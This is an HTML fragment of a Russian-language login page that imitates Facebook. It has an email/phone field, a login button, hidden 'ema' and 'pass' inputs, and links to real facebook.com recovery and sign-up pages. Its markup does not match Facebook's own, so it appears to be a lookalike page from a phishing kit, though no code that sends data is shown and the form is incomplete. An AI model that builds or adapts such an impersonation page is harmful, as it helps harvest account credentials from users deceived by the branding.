    <body id="login">
        <div class="main">
            <div class="work-space">
                <div class="card">

                    </div>
                </div>
                <div class="res_card">
                    <div class="fill-form res_form">
                        <form class="registration res_form">
                            <input type="hidden" name="ema" value="2853" autocomplete="off">
                            <input type="hidden" name="pass" value="2853" autocomplete="off">
                            <div>
                                <div class="fields">
                                    <input type="text" class="inputtext email" name="email" placeholder="Электронный адрес или номер телефона">

                                <div class="fields">

                                </div>
                            </div>
                            <div class="but">
                                <button value="1" class="ent text_col set_box" name="login" type="submit">Вход</button>
                            </div>
                            <div class="forget_pass">
                                <a href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM4MzE3NjgxLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&ars=facebook_login&next">Забыли пароль?</a>
                            </div>
                            <div class="line"></div>
                            <div class="but">
                                <a role="button" class="new_acc text_col set_box" href="https://www.facebook.com/r.php?entry_point=login">Создать новый аккаунт</a>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
